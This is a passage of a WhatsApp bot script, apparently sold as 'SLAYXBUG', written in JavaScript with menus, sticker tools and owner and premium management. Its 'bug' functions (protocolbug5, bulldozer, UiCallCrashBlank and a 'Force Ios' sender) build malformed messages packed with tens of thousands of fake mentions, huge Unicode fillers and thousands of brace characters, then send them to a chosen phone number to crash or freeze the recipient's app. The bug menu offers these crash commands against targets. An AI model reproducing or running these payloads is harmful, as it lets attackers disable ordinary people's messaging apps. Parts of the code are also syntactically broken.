                    id: "ABCDEF1234567890"
                },
                expiration: 86400,
                ephemeralSettingTimestamp: "1728090592378",
                ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
                externalAdReply: {
                    title: "FINIX - CRITICAL FINISH",
                    body: `Ai To Crash ${'\0'.repeat(200)}`,
                    mediaType: "VIDEO",
                    renderLargerThumbnail: true,
                    previewType: "VIDEO",
                    thumbnail: Jepeg,
                    sourceType: "x",
                    sourceId: "x",
                    sourceUrl: "https://www.facebook.com/WhastApp",
                    mediaUrl: "https://www.facebook.com/WhastApp",
                    containsAutoReply: true,
                    showAdAttribution: true,
                    ctwaClid: "ctwa_clid_example",
                    ref: "ref_example"
                },
                entryPointConversionSource: "entry_point_source_example",
                entryPointConversionApp: "entry_point_app_example",
                entryPointConversionDelaySeconds: 5,
                disappearingMode: {},
                actionLink: {
                    url: "https://www.facebook.com/WhatsApp"
                },
                groupSubject: "Example Group Subject",
                parentGroupJid: "13135550002@g.us",
                trustBannerType: "trust_banner_example",
                trustBannerAction: 1,
                isSampled: false,
                utm: {
                    utmSource: "utm_source_example",
                    utmCampaign: "utm_campaign_example"
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "13135550002@newsletter",
                    serverMessageId: 1,
                    newsletterName: "Meta Ai",
                    contentType: "UPDATE",
                    accessibilityText: "Meta Ai"
                },
                businessMessageForwardInfo: {
                    businessOwnerJid: "13135550002@s.whatsapp.net"
                },
                smbriyuCampaignId: "smb_riyu_campaign_id_example",
                smbServerCampaignId: "smb_server_campaign_id_example",
                dataSharingContext: {
                    showMmDisclosure: true
                }
            }
        }
    },
    Ptcp
        ? {
              participant: {
                  jid: isTarget
              }
          }
        : {}
       
);
console.log("Success! Force Ios Sent")
}

async function protocolbug5(isTarget, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".Tama Ryuichi" + "ោ៝".repeat(10000),
        title: "Finix",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "༿༑ᜳ𝗥‌𝗬𝗨‌𝗜‌𝗖‌‌‌𝗛‌𝗜‌ᢶ⃟"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await Ryc.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: isTarget }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await Ryc.relayMessage(isTarget, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
} 

async function bulldozer(isTarget) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(isTarget, message, {});

  await Ryc.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: isTarget },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
async function UiCallCrashBlank(Ryc, target) {
  const msgUiCall = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              expiration: 1,
              ephemeralSettingTimestamp: 1,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              entryPointConversionDelaySeconds: 1,
              disappearingMode: {
                initiatorDeviceJid: target,
                initiator: "INITIATED_BY_OTHER",
                trigger: "UNKNOWN_GROUPS"
              },
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 1,
                  expiryTimestamp: null
                }
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true
              }
            },
            body: {
              text: "SLAYXBUG 🦠 🩸 ༑ ESCANOR ✦ SLAY" + "ꦾ".repeat(50000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(20000),
              buttons: [
                { name: "single_select", buttonParamsJson: "" },
                { name: "call_permission_request", buttonParamsJson: "" }
              ]
            }
          }
        }
      }
    },
    {}
  );
  await Ryc.relayMessage(target, msgUiCall.message, {
    participant: { jid: target },
    messageId: msgUiCall.key.id
  });

  const spamMention = Array.from({ length: 1950 }, () => `1${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`);
  const teks = "᬴".repeat(250000);

  const callUiMsg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              expiration: 1,
              ephemeralSettingTimestamp: 1,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              entryPointConversionDelaySeconds: 1,
              disappearingMode: {
                initiatorDeviceJid: target,
                initiator: "INITIATED_BY_OTHER",
                trigger: "UNKNOWN_GROUPS"
              },
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 1,
                  expiryTimestamp: null
                }
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true
              }
            },
            body: {
              text: "MIKASA??" + "ꦾ".repeat(50000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(20000),
              buttons: [
                { name: "single_select", buttonParamsJson: "" },
                { name: "call_permission_request", buttonParamsJson: "" }
              ]
            }
          }
        }
      }
    },
    {}
  );
  await Ryc.relayMessage(target, callUiMsg.message, {
    messageId: callUiMsg.key.id,
    participant: { jid: target }
  });
  await Ryc.sendMessage(target, { text: teks, contextInfo: { mentionedJid: spamMention } });

  const CrashBload = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "⟅ ༑ ▾ MIKASA • 𝐗-ZALL ༑ ⟅", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            version: 3,
            paramsJson: JSON.stringify({
              trigger: true,
              action: "call_crash",
              note: "🩸 ༑ ESCANOR 炎 SLAY⟅ ༑ 🩸",
              filler: "꧔".repeat(50000)
            })
          }
        }
      }
    },
    nativeFlowMessage: {
      name: "render_crash_component",
      messageParamsJson: "{".repeat(70000)
    },
    audioMessage: {
      mimetype: "audio/ogg; codecs=opus",
      fileSha256: "5u7fWquPGEHnIsg51G9srGG5nB8PZ7KQf9hp2lWQ9Ng=",
      fileLength: "9999999999",
      seconds: 999999,
      ptt: true,
      streamingSidecar: "꧔꧈".repeat(9999)
    }
  };
  await Ryc.relayMessage(target, { message: CrashBload }, { messageId: callUiMsg.key.id });

  const blankContent = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 1,
              expiryTimestamp: null
            }
          },
          externalAdReply: {
            showAdAttribution: false,
            renderLargerThumbnail: true
          },
          header: {
            title: "𝐀𝐗𝐆𝐀𝐍𝐊 • 𝐗-𝐂𝐎𝐑𝐄",
            hasMediaAttachment: false,
            locationMessage: {
              degreesLatitude: 992.999999,
              degreesLongitude: -932.8889989,
              name: "\u900A",
              address: "\u0007".repeat(20000)
            }
          },
          body: { text: "𝐀𝐗𝐆𝐀𝐍𝐊 • 𝐗-𝐂𝐎𝐑𝐄" },
          interactiveResponseMessage: {
            body: { text: "𝐀𝐗𝐆𝐀𝐍𝐊 • 𝐗-𝐂𝐎𝐑𝐄", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              status: true,
              messageParamsJson: "{".repeat(5000) + "[".repeat(5000),
              paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "MIKASA • 𝐗-Zall",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "cyber@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(70000)}",
                "screen_0_TextInput_1": "Why?",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
              }`,
              version: 3
            }
          }
        }
      }
    }
  };
  const msgBlank = await generateWAMessageFromContent(target, blankContent, {});
  await Ryc.relayMessage(target, msgBlank.message, { messageId: msgBlank.key.id });
}
//END
//STIKER AND BRAT FUNCTION

function getRandomFile(ext) {
    return `${Math.floor(Math.random() * 10000)}${ext}`;
}
async function makeStickerFromUrl(imageUrl, Ryc, m) {
    try {
        let buffer;
        if (imageUrl.startsWith("data:")) {
            const base64Data = imageUrl.split(",")[1];
            buffer = Buffer.from(base64Data, 'base64');
        } else {
            const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
            buffer = Buffer.from(response.data, "binary");
        }
        
        const webpBuffer = await sharp(buffer)
            .resize(512, 512, { fit: 'contain', background: { r: 255, g: 255, b: 255, alpha: 0 } })
            .webp({ quality: 70 })
            .toBuffer();
        
        const penis = await addExif(webpBuffer, global.packname, global.author)

        const fileName = getRandomFile(".webp");
        fs.writeFileSync(fileName, webpBuffer);

        await Ryc.sendMessage(m.chat, {
            sticker: penis,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: `Tamzz`,
                    body: `Tamzz`,
                    mediaType: 3,
                    renderLargerThumbnail: false,
                    thumbnailUrl: ThumbUrl, 
                    sourceUrl: `https://youtube.com/@RILLYZY`
                }
            }
        }, { quoted: lol });

        fs.unlinkSync(fileName);
    } catch (error) {
        console.error("Error creating sticker:", error);
        ReplyRyc('Terjadi kesalahan saat membuat stiker. Coba lagi nanti.');
    }
}

async function fetchBuffer (url, options) {
  try {
    options ? options : {};
    const res = await axios({
      method: "GET",
      url,
      headers: {
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36",
        DNT: 1,
        "Upgrade-Insecure-Request": 1,
      },
      ...options,
      responseType: "arraybuffer",
    });
    return res.data;
  } catch (err) {
    return err;
  }
};

Ryc.ments = async (text) => {
    return [m.sender];
};

//END

const RunTime = `_${runtime(process.uptime())}_`
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
switch(command) {
//ALL MENU CASE {
case "menu": {
    let anj = `
.Hello im mikasa v10g2 created by Zall i am here to help you

/`[ Information Bot ]\`
▢ Developer : TRAFALGAR 
▢ Botname : SLAYXBUG 
▢ Version : 10.0.0 GEN2
▢ Type : Case
▢ Runtime : ${runtime(process.uptime())}
□ Telegram: t.me/Dev_Trafalgar 
□ TIKTOK: trafalgarsa10
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧`;
await Ryc.sendMessage(m.chat, {
  footer: `©  SLAYXBUG `,
  buttons: [
    {
      buttonId: `.allmenu`,
      buttonText: { displayText: 'All menu' },
      type: 1
    },
    {
      buttonId: `.about`,
      buttonText: { displayText: 'About' },
      type: 1
    },
    {
      buttonId: `.buysc`,
      buttonText: { displayText: 'Buysc' },
      type: 1
    } 
}
break
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `TRAFALGARIsHere`,
  mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
  fileLength: 99999999,
  caption: anj,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }, 
    externalAdReply: {
      title: `TRAFALGAR Dev`,
      body: `TRAFALGAR Dev`,
      thumbnailUrl: "https://img1.pixhost.to/images/7850/630591351_1001781914.jpg",
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break      
case "allmenu": {
    let anj = `
  \`[ 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 ]\`
▢ Developer : TRAFALGAR D LAW
▢ Botname : SLAYXBUG 
▢ Version : 10.0.0 GEN2
▢ Type : Case
▢ Runtime : ${runtime(process.uptime())}
□ Telegram: t.me/Dev_Trafalgar 
□ TIKTOK: zallforys

[ 夜 ] [ Allmenu ] [ 夜 ] 
▢ .bugmenu
▢ .grupmenu
▢ .toolsmenu 
▢ .ownermenu
▢ .bannedmenu

┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧`;
await Ryc.sendMessage(m.chat, {
  footer: `© TRAFALGAR Is Here🏀`,
  buttons: [
    {
      buttonId: `.allmenu`,
      buttonText: { displayText: 'All menu' },
      type: 1
    },
    {
      buttonId: `.about`,
      buttonText: { displayText: 'About' },
      type: 1
    }, 
    {
      buttonId: `.buysc`,
      buttonText: { displayText: 'Buysc' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `SLAYXBUG `,
  mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
  fileLength: 99999999,
  caption: anj,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }, 
    externalAdReply: {
      title: `TRAFALGAR Dev`,
      body: `TRAFALGAR Dev`,
      thumbnailUrl: "https://img1.pixhost.to/images/7850/630591351_1001781914.jpg",
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
}) 
}
break
case "groupmenu": {
    let anj = `
 \`[ 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 ]\`
▢ Developer : TRAFALGAR D LAW 
▢ Botname : SLAYXBUG 
▢ Version : 10.0.0 GEN2
▢ Type : Case
▢ Runtime : ${runtime(process.uptime())}
□ Telegram: t.me/Dev_Trafalgar 
□ TIKTOK: zallforys

[ 夜 ] [ Group ] [ 夜 ] 
▢ Reset link gc *Auto*
▢ Getlinkgc *Auto*
▢ Hidetag *Text*
▢ Tagall *Text*
▢ Kick *@Tag*

[ 夜 ] [ THANKS ] [ 夜 ]
- ME [ Dev ]
-MY MOM[
-MY DAD [ESCANOR]
-NO NAME [FRIEND]
- LORD AZIZ[THE BOSS]
 -CRUSH [SLAY]
- LUST[PARTNER]
- All User [GOOD]
- Mon comrade qui me off [ Sasuké ]
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧`;
await Ryc.sendMessage(m.chat, {
  footer: `SLAYCRASHER`,
  buttons: [
    {
      buttonId: `.allmenu`,
      buttonText: { displayText: 'All menu' },
      type: 1
    },
    {
      buttonId: `.about`,
      buttonText: { displayText: 'About' },
      type: 1
    }, 
    {
      buttonId: `.buysc`,
      buttonText: { displayText: 'Buysc' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `TRAFALGAR DEV`,
  mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
  fileLength: 99999999,
  caption: anj,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }, 
    externalAdReply: {
      title: `Slayxbug`,
      body: `TRAFALGAR DEV`,
      thumbnailUrl: "https://img1.pixhost.to/images/7850/630591351_1001781914.jpg",
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
}) 
}
break 
case "toolsmenu": {
    let anj = `
 \`[ 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 ]\`
▢ Developer : TRAFALGAR 
▢ Botname : SLAYXBUG 
▢ Version : 10.0.0 GEN2
▢ Type : Case
▢ Runtime : ${runtime(process.uptime())}
□ Telegram: t.me/Dev_Trafalgar 
□ TIKTOK: zallforys

[ 夜 ] [ Tools ] [ 夜 ] 
▢ Sticker *Reply*
▢ Tiktok *Link*
▢ Tovn *Reply*
▢ Play *Title*
▢ Brat *Text*
▢ Rvo *Reply*
▢ Qc *Reply*
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧`;
await Ryc.sendMessage(m.chat, {
  footer: `© SLAYXBUG `,
  buttons: [
    {
      buttonId: `.all`,
      buttonText: { displayText: 'All menu' },
      type: 1
    },
    {
      buttonId: `.about`,
      buttonText: { displayText: 'About' },
      type: 1
    }, 
    {
      buttonId: `.buysc`,
      buttonText: { displayText: 'Buysc' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `TRAFALGARDEV`,
  mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
  fileLength: 99999999,
  caption: anj,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }, 
    externalAdReply: {
      title: `TRAFALGARDEV`,
      body: `TRAFALGAR DEV`,
      thumbnailUrl: "https://img1.pixhost.to/images/7850/630591351_1001781914.jpg",
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break
case "bugmenu": {
    let anj = `
 \`[ 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 ]\`
▢ Developer : TRAFALGAR 
▢ Botname : SLAYXBUG 
▢ Version : 10.0.0 GEN2
▢ Type : Case
▢ Runtime : ${runtime(process.uptime())}
□ Telegram: t.me/Zalltamvan
□ TIKTOK: zallforys

[ 夜 ] [ Bug ] [ 夜 ]
▢ Rumbling-ios*224xx*
▢ Rumbling-DELAY *224xx*
▢ Rumbling-trap *224xx*
▢ Rumbling-invis *224xx*
▢ Rumbling-delay *224xx*
▢ Rumbling-ui *224xx*
▢ RUMBLING-freeze *224xx*
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧`;
await Ryc.sendMessage(m.chat, {
  footer: `© TRAFALGAR Is Here🏀`,
  buttons: [
    {
      buttonId: `.allmenu`,
      buttonText: { displayText: 'Allmenu' },
      type: 1
    },
    {
      buttonId: `.about`,
      buttonText: { displayText: 'About' },
      type: 1
    }, 
    {
      buttonId: `.buysc`,
      buttonText: { displayText: 'Buysc' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `zall`,
  mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
  fileLength: 99999999,
  caption: anj,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }, 
    externalAdReply: {
      title: `TRAFALGAR Dev`,
      body: `TRAFALGAR Dev`,
      thumbnailUrl: "https://img1.pixhost.to/images/7850/630591351_1001781914.jpg",
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break
case "ownermenu": {
    let anj = `
 \`[ 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 ]\`
▢ Developer : TRAFALGAR 
▢ Botname : SLAYXBUG 
▢ Version : 10.0.0 GEN2
▢ Type : Case
▢ Runtime : ${runtime(process.uptime())}
□ Telegram: t.me/Zalltamvan
□ TIKTOK: zallforys

[ 夜 ] [ Owner ] [ 夜 ]
▢ addowner *224xx*
▢ addprem *224xx*
▢ delowner *224xx*
▢ delprem *224xx*
▢ setpp *224xx*
▢ delpp *224xx*
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧`;
await Ryc.sendMessage(m.chat, {
  footer: `© TRAFALGAR Is Here🏀`,
  buttons: [
    {
      buttonId: `.allmenu`,
      buttonText: { displayText: 'Allmenu' },
      type: 1
    },
    {
      buttonId: `.about`,
      buttonText: { displayText: 'About' },
      type: 1
    }, 
    {
      buttonId: `.buysc`,
      buttonText: { displayText: 'Buysc' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `TRAFALGAR DevIsHere`,
  mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
  fileLength: 99999999,
  caption: anj,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }, 
    externalAdReply: {
      title: `TRAFALGAR Dev`,
      body: `TRAFALGAR Dev`,
      thumbnailUrl: "https://img1.pixhost.to/images/7850/630591351_1001781914.jpg",
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break
case "bannedmenu": {
    let anj = `
 \`[ 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 ]\`
▢ Developer : TRAFALGAR 
▢ Botname : SLAYXBUG 
▢ Version : 10.0.0 GEN2
▢ Type : Case
▢ Runtime : ${runtime(process.uptime())}
□ Telegram: t.me/Dev_Trafalgar 
□ TIKTOK: zallforys

[ 夜 ] [ Banned ] [ 夜 ]
▢ banned *224xx*
▢ banned2 *224xx*
▢ banned3 *224xx* 
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧`;
await Ryc.sendMessage(m.chat, {
  footer: `© TRAFALGAR Is Here🏀`,
  buttons: [
    {
      buttonId: `.allmenu`,
      buttonText: { displayText: 'Allmenu' },
      type: 1
    },
    {
      buttonId: `.about`,
      buttonText: { displayText: 'About' },
      type: 1
    }, 
    {
      buttonId: `.buysc`,
      buttonText: { displayText: 'Buysc' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `TRAFALGAR DevIsHere`,
  mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
  fileLength: 99999999,
  caption: anj,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }, 
    externalAdReply: {
      title: `TRAFALGAR Dev`,
      body: `TRAFALGAR Dev`,
      thumbnailUrl: "https://img1.pixhost.to/images/7850/630591351_1001781914.jpg",
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break

case 'addowner': case 'addown':
if (!CreatorOnly) return ReplyRyc("*Your Not My Onwer*")
  if (!args[0]) return ReplyRyc(`Penggunaan ${prefix + command} Example ${prefix + command} 62 xxx-xxxx-xxxx`);
  numero = qtext.split("|")[0].replace(/[^0-9]/g, '');
  let loadnum = await Ryc.onWhatsApp(numero + `@s.whatsapp.net`);
  if (loadnum.length == 0) return ReplyRyc(`Number Invalid!!!`);
  owner.push(numero);
  Premium.push(numero);
  fs.writeFileSync('./Access/Own.json', JSON.stringify(owner));
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  ReplyRyc(`Number ${numero} succes add to database!`);
  break;

case 'delowner': case 'delown':
if (!CreatorOnly) return ReplyRyc("*Your Not My Onwer*")
  if (!args[0]) return ReplyRyc(`Penggunaan ${prefix + command} Example:\n ${prefix + command} 62 xxx-xxxx-xxxx`);
  numero2 = qtext.split("|")[0].replace(/[^0-9]/g, '');
  numeroX = Owner.indexOf(numero2);
  numload = Premium.indexOf(numero2);
  Owner.splice(numeroX, 1);
  Premium.splice(numload, 1);
  fs.writeFileSync('./Access/Own.json', JSON.stringify(Owner));
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  ReplyRyc(`Number ${numero2} succes delate to database!`);
  break;

case 'addpremium': case 'addprem':
if (!CreatorOnly) return ReplyRyc("*Your Not My Onwer*")
  if (!args[0]) return ReplyRyc(`Penggunaan ${prefix + command} Example ${prefix + command} 62 xxx-xxxx-xxxx`);
  numero = qtext.split("|")[0].replace(/[^0-9]/g, '');
  let Invalid = await Ryc.onWhatsApp(numero + `@s.whatsapp.net`);
  if (Invalid.length == 0) return ReplyRyc(`Number Invalid!!!`);
  Premium.push(numero);
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  ReplyRyc(`Number ${numero} succes add to database!`);
  break;

case 'delpremium': case 'delprem':
if (!CreatorOnly) return ReplyRyc("*Your Not My Onwer*")
  if (!args[0]) return ReplyRyc(`Penggunaan ${prefix + command} Example ${prefix + command} 62 xxx-xxxx-xxxx`);
  numero2 = qtext.split("|")[0].replace(/[^0-9]/g, '');
  numeroX = Premium.indexOf(numero2);
  Premium.splice(numeroX, 1);
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  ReplyRyc(`Number ${numero2} succes delate to database!`);
  break;


case "rvo":
